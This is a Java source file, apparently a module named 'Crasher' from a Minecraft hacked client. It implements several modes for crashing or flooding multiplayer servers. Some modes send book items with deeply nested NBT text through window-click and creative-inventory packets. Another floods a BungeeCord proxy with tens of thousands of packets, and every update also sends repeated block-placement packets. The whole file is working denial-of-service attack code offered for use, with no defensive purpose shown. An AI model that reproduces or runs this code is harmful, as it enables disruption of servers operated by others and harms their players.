package lime.features.module.impl.exploit;

import lime.core.events.EventTarget;
import lime.core.events.impl.EventUpdate;
import lime.features.module.Category;
import lime.features.module.Module;
import lime.features.setting.impl.EnumProperty;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.BlockPos;

public class Crasher extends Module {
    public Crasher() {
        super("Crasher", Category.EXPLOIT);
    }

    private final EnumProperty mode = new EnumProperty("Mode", this, "Bungeecord Flood", "Bungeecord Flood", "Click Window", "Custom Payload", "Exploit Fixer", "Funcraft");
    private Thread thread;

    @EventTarget
    public void onUpdate(EventUpdate e) {
        for (int i = 0; i < 5; i++) {
            mc.getNetHandler().sendPacketNoEvent(new C08PacketPlayerBlockPlacement(new BlockPos(20927, 66, 37958), 1, mc.thePlayer.getHeldItem(), 0, 0, 0));
        }
    }

    @Override
    public void onEnable() {
        switch(mode.getSelected()) {
            case "Exploit Fixer":
                NBTTagCompound var1 = new NBTTagCompound();
                NBTTagList var2 = new NBTTagList();
                String var3 = "";
                var3 = String.valueOf((new StringBuilder()).append(var3).append("{"));

                int var4;
                for(var4 = 0; var4 < 900; ++var4) {
                    var3 = String.valueOf((new StringBuilder()).append(var3).append("extra:[{"));
                }

                for(var4 = 0; var4 < 900; ++var4) {
                    var3 = String.valueOf((new StringBuilder()).append(var3).append("text:a}],"));
                }

                var3 = String.valueOf((new StringBuilder()).append(var3).append("text:a}"));
                var2.appendTag(new NBTTagString(var3));
                var1.setString("author", "SnyCorleone");
                var1.setString("title", "SMods 3.0");
                var1.setByte("resolved", (byte)1);
                var1.setTag("pages", var2);
                ItemStack var5 = new ItemStack(Items.writable_book);
                var5.setTagCompound(var1);
                mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 20, 100, 100, var5, (short)100));
                break;
            case "Bungeecord Flood":
                thread = new Thread(() -> {
                    for (int i = 0; i < 10000; i++) {
                        mc.getNetHandler().sendPacketNoEvent(new C03PacketPlayer(true));
                        mc.getNetHandler().sendPacketNoEvent(new C08PacketPlayerBlockPlacement(new ItemStack(Items.bread)));
                        mc.getNetHandler().sendPacketNoEvent(new C03PacketPlayer(true));
                        mc.getNetHandler().sendPacketNoEvent(new C08PacketPlayerBlockPlacement(new ItemStack(Items.potato)));
                    }
                });
                break;
            case "Click Window":
                thread = new Thread(() -> {
                    NBTTagCompound nBTTagCompound = new NBTTagCompound();
                    NBTTagList nBTTagList = new NBTTagList();
                    String string = "";
                    string = String.valueOf(new StringBuilder().append(string).append("{"));
                    for (int n = 0; n < 900; ++n) {
                        string = String.valueOf(new StringBuilder().append(string).append("extra:[{"));
                    }
                    for (int n = 0; n < 900; ++n) {
                        string = String.valueOf(new StringBuilder().append(string).append("text:a}],"));
                    }
                    string = String.valueOf(new StringBuilder().append(string).append("text:a}"));
                    nBTTagList.appendTag(new NBTTagString(string));
                    nBTTagCompound.setString("author", "hello");
                    nBTTagCompound.setString("title", "hello");
                    nBTTagCompound.setByte("resolved", (byte)1);
                    nBTTagCompound.setTag("pages", nBTTagList);
                    ItemStack itemStack = new ItemStack(Items.writable_book);
                    itemStack.setTagCompound(nBTTagCompound);
                    mc.getNetHandler().sendPacketNoEvent(new C0EPacketClickWindow(0, 20, 100, 100, itemStack, (short) 100));
                });
                break;
            case "Custom Payload":
                thread = new Thread(() -> {
                    NBTTagCompound nBTTagCompound = new NBTTagCompound();
                    NBTTagList nBTTagList = new NBTTagList();
                    String string = "";
                    for (int i = 0; i < 900; ++i) {
                        string = String.valueOf(new StringBuilder().append(string).append("_"));
                    }
                    nBTTagList.appendTag(new NBTTagString(string));
                    nBTTagCompound.setString("author", "SnyCorleone");
                    nBTTagCompound.setString("title", "SMods 3.0");
                    nBTTagCompound.setByte("resolved", (byte)1);
                    nBTTagCompound.setTag("pages", nBTTagList);
                    ItemStack itemStack = new ItemStack(Items.writable_book);
                    itemStack.setTagCompound(nBTTagCompound);
                    mc.getNetHandler().sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, itemStack));
                });
                break;
        }
        if(thread != null) {
            thread.start();
        }
    }

    @Override
    public void onDisable() {
        if(thread != null) {
            thread.stop();
        }
    }
}
